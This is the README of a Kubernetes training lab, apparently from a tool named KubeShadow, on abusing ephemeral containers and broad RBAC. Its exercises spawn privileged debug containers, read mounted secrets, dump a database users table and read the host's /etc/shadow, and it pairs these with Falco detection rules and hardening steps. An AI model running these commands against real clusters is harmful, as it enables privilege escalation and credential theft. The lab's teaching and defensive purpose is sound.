# Ephemeral Container Attack Lab

This lab demonstrates how misuse of ephemeral container permissions and overly broad RBAC can allow attackers to spawn privileged debugging containers in pods, leading to container escape and data exfiltration.

## 🎯 Lab Overview

### Attack Scenarios Covered:
1. **Privilege Escalation** via ephemeral containers
2. **Data Exfiltration** from database pods
3. **Host Access** through privileged pods
4. **RBAC Exploitation** for lateral movement
5. **Container Escape** techniques

### Security Concepts Demonstrated:
- **Ephemeral Container Abuse** for privilege escalation
- **RBAC Misconfigurations** enabling attacks
- **Pod Security Standards** for defense
- **Network Policies** for access control
- **Detection and Prevention** strategies

## 🏗️ Lab Architecture

### Vulnerable Environment (`ephemeral-lab` namespace):
```
ephemeral-lab/
├── Namespaces: ephemeral-lab
├── ServiceAccounts: debug-sa (overly permissive)
├── RBAC: 
│   ├── Role: debug-role (excessive permissions)
│   ├── ClusterRole: debug-cluster-role (cluster-wide)
│   ├── RoleBinding: debug-role-binding
│   └── ClusterRoleBinding: debug-cluster-role-binding
├── Pods:
│   ├── web-app (vulnerable web application)
│   ├── database (PostgreSQL with sensitive data)
│   └── monitoring (privileged pod with host access)
├── Secrets: app-secrets, db-secrets
└── ConfigMaps: app-config
```

### Secure Environment (`secure-ephemeral-lab` namespace):
```
secure-ephemeral-lab/
├── Namespaces: secure-ephemeral-lab
├── ServiceAccounts: secure-debug-sa (minimal permissions)
├── RBAC:
│   ├── Role: secure-debug-role (restricted permissions)
│   └── RoleBinding: secure-debug-role-binding
├── Pods:
│   ├── secure-web-app (properly secured)
│   └── secure-database (minimal privileges)
├── NetworkPolicy: secure-ephemeral-netpol
└── PodSecurityPolicy: secure-ephemeral-psp
```

## 🚀 Quick Start

### Option 1: Automated Deployment
```bash
# Deploy complete lab environment
./kubeshadow lab --provider minikube --dashboard

# Deploy ephemeral container lab
kubectl apply -f modules/lab/manifests/09-ephemeral-containers.yaml
kubectl apply -f modules/lab/manifests/10-secure-ephemeral.yaml
```

### Option 2: Manual Deployment
```bash
# Start minikube
minikube start --driver=docker --memory=4096 --cpus=2

# Deploy lab manifests
kubectl apply -f modules/lab/manifests/09-ephemeral-containers.yaml
kubectl apply -f modules/lab/manifests/10-secure-ephemeral.yaml

# Verify deployment
kubectl get pods -n ephemeral-lab
kubectl get pods -n secure-ephemeral-lab
```

## 🔍 Lab Exercises

### Exercise 1: Reconnaissance
```bash
# List vulnerable pods
kubectl get pods -n ephemeral-lab -o wide

# Check RBAC permissions
kubectl auth can-i create pods/ephemeralcontainers --as=system:serviceaccount:ephemeral-lab:debug-sa -n ephemeral-lab

# Identify sensitive data
kubectl get secrets -n ephemeral-lab
kubectl get configmaps -n ephemeral-lab
```

### Exercise 2: Web Application Attack
```bash
# Create privileged ephemeral container
kubectl debug web-app -n ephemeral-lab --image=busybox --target=web-server --privileged -- sleep 3600

# Access the ephemeral container
kubectl exec -it web-app -n ephemeral-lab -c debug -- /bin/sh

# Explore and extract data
ls -la /etc/secrets/
cat /etc/secrets/api-key
```

### Exercise 3: Database Exploitation
```bash
# Create ephemeral container in database pod
kubectl debug database -n ephemeral-lab --image=postgres:13 --target=postgres -- sleep 3600

# Access the ephemeral container
kubectl exec -it database -n ephemeral-lab -c debug -- /bin/bash

# Connect to database
psql -U admin -d sensitive_data -c "SELECT * FROM users;"
```

### Exercise 4: Privileged Pod Attack
```bash
# Create privileged ephemeral container
kubectl debug monitoring -n ephemeral-lab --image=alpine --target=monitoring-agent --privileged -- sleep 3600

# Access the ephemeral container
kubectl exec -it monitoring -n ephemeral-lab -c debug -- /bin/sh

# Explore host filesystem
ls -la /host/root/
cat /host/etc/shadow
```

### Exercise 5: Secure Environment Testing
```bash
# Test RBAC restrictions
kubectl auth can-i create pods/ephemeralcontainers --as=system:serviceaccount:secure-ephemeral-lab:secure-debug-sa -n secure-ephemeral-lab

# Attempt ephemeral container creation (should fail)
kubectl debug secure-web-app -n secure-ephemeral-lab --image=busybox --target=web-server --privileged -- sleep 3600
```

## 🛡️ Security Vulnerabilities

### High Severity:
- **Overly permissive RBAC** allowing ephemeral container creation
- **Privileged pods** with host access capabilities
- **Exposed secrets** in environment variables and volumes
- **Cluster-wide permissions** for debugging

### Medium Severity:
- **Weak security contexts** in containers
- **Excessive capabilities** granted to containers
- **Host volume mounts** for container escape
- **Unrestricted network access**

### Low Severity:
- **Verbose logging** with sensitive data
- **Default service accounts** with permissions
- **Missing network policies**
- **Insufficient monitoring**

## 🔍 Detection and Prevention

### Detection Rules (Falco):
```yaml
- rule: Ephemeral Container Created
  desc: Detect creation of ephemeral containers
  condition: >
    ka.verb=create and
    ka.target.resource=pods/ephemeralcontainers
  output: >
    Ephemeral container created (user=%ka.user.name
    pod=%ka.target.name namespace=%ka.target.namespace)
  priority: WARNING

- rule: Privileged Ephemeral Container
  desc: Detect privileged ephemeral containers
  condition: >
    ka.verb=create and
    ka.target.resource=pods/ephemeralcontainers and
    ka.req.pod.spec.containers[0].securityContext.privileged=true
  output: >
    CRITICAL: Privileged ephemeral container created
  priority: CRITICAL
```

### Prevention Measures:
1. **RBAC Restrictions**: Limit ephemeral container permissions
2. **Pod Security Standards**: Implement security contexts
3. **Network Policies**: Restrict network access
4. **Admission Controllers**: Validate configurations
5. **Comprehensive Monitoring**: Detect and respond to threats

## 🧹 Cleanup

### Remove Lab Environment:
```bash
# Remove vulnerable environment
kubectl delete namespace ephemeral-lab

# Remove secure environment
kubectl delete namespace secure-ephemeral-lab

# Or use automated cleanup
./kubeshadow lab cleanup
```

### Manual Cleanup:
```bash
# Remove specific resources
kubectl delete -f modules/lab/manifests/10-secure-ephemeral.yaml
kubectl delete -f modules/lab/manifests/09-ephemeral-containers.yaml
```

## 📊 Monitoring and Analysis

### Dashboard Integration:
```bash
# Start KubeShadow dashboard
./kubeshadow dashboard

# Run commands with monitoring
./kubeshadow recon --dashboard
./kubeshadow rbac-escalate --dashboard
```

### Key Metrics to Monitor:
- Ephemeral container creation frequency
- Privileged container usage
- Host access attempts
- Unusual network patterns
- Resource usage anomalies

## 🎓 Learning Outcomes

### Students will learn to:
1. **Identify RBAC misconfigurations** that enable attacks
2. **Exploit ephemeral containers** for privilege escalation
3. **Perform container escape** techniques
4. **Extract sensitive data** from compromised environments
5. **Implement security controls** to prevent attacks
6. **Detect and respond** to security incidents

### Security Skills Developed:
- **Kubernetes Security Assessment**
- **RBAC Configuration Review**
- **Container Security Testing**
- **Incident Response Procedures**
- **Security Control Implementation**

## 🚨 Security Warning

**⚠️ IMPORTANT**: This lab contains intentionally vulnerable configurations for educational purposes only. Never deploy these configurations in production environments.

### Safety Guidelines:
1. **Lab Environment Only** - Never use in production
2. **Network Isolation** - Ensure lab clusters are isolated
3. **Resource Monitoring** - Monitor cloud resource usage
4. **Access Control** - Limit access to lab environments
5. **Data Sensitivity** - No real sensitive data should be used

## 📚 Additional Resources

### Documentation:
- [Kubernetes Ephemeral Containers](https://kubernetes.io/docs/concepts/workloads/pods/ephemeral-containers/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [RBAC Best Practices](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [Falco Security Monitoring](https://falco.org/)

### Tools and References:
- [KubeShadow Documentation](../README.md)
- [Lab Usage Examples](../../examples/lab-usage.md)
- [Security Testing Guide](../../docs/security-testing.md)
- [Dashboard User Guide](../../docs/dashboard.md)

---

**Happy Learning! 🚀**

The Ephemeral Container Attack Lab provides hands-on experience with advanced Kubernetes security testing. Practice responsibly and always follow ethical guidelines!
